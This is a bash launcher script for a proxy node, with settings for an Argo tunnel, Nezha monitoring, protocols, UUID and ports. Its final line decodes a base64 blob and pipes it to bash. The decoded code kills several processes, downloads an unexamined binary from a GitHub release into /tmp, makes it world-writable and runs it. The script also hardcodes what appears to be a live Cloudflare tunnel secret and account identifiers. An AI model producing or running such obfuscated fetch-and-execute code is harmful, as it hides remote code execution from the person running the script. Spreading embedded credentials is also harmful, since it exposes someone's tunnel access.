#!/bin/bash

# //
export TOK=${TOK:-'{"AccountTag":"e8e6c62bc0e4191abae77c7222210ae7","TunnelSecret":"giVLBay4yJIKvCwsr7DGrOO6UxVrkBrtj2fdHSqxVJs=","TunnelID":"cc6e9b9a-d373-4b23-b2c1-33e873f1732f","Endpoint":""}'}  # 
export ARGO_DOMAIN=${ARGO_DOMAIN:-'node09.google.cloudns.biz'} # 

# //
export NEZHA_SERVER=${NEZHA_SERVER:-''}
export NEZHA_KEY=${NEZHA_KEY:-''}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_TLS=${NEZHA_TLS:-'1'}  # 

# //
export TMP_ARGO=${TMP_ARGO:-'xhttp'}  # vls,vms,spl,xhttp,rel,hy2,tuic，sock,3x
export UUID=${UUID:-'f3aa7bea-7d94-40b0-b17b-b25f8c93381e'} # 去掉#可以使用固定值，否则随机
export VL_PORT=${VL_PORT:-'8002'} #
export VM_PORT=${VM_PORT:-'8001'} #
export CF_IP=${CF_IP:-'linux.do'}  # 
export SUB_NAME=${SUB_NAME:-'shiny'} # 
export second_port=${second_port:-''} #

# //
# export SUB_URL='https://xxx.eu.org/upload-上传密钥' # 自动上传节点到订阅服务器，需要与服务器搭配

# //
# export JAR_SH='moni'

# //
# export FLIE_PATH="$PWD/worlds/"

# //启动程序
echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash
